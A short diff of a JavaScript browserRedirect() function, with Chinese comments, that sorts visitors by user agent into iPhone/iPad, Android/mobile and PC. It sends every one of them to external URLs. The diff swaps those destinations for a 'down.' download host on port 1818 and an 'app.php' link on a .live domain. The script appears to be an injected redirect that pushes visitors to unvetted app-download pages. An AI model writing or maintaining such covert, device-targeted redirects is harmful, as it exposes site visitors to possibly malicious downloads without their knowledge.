@@ -10,13 +10,13 @@ function browserRedirect() {
     var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";
     if (bIsIphoneOs || bIsIpad) {
         // alert('iphone') // 识别 苹果
-        window.location.href = "https://down.bolinart.shop:1818/WXWz.html";
+        window.location.href = "https://down.bolinart.shop:1818/oqLM.html";
     } else if (bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
         //alert('android') // 识别 安卓
-        window.location.href = "https://mvsos.live/nlzyupymat";
+        window.location.href = "https://umidos.live/app.php/61377";
     } else {
         //alert('pc') // 识别 pc
-        window.location.href = "https://mvsos.live/nlzyupymat";
+        window.location.href = "https://umidos.live/app.php/61377";
     }
 }
 
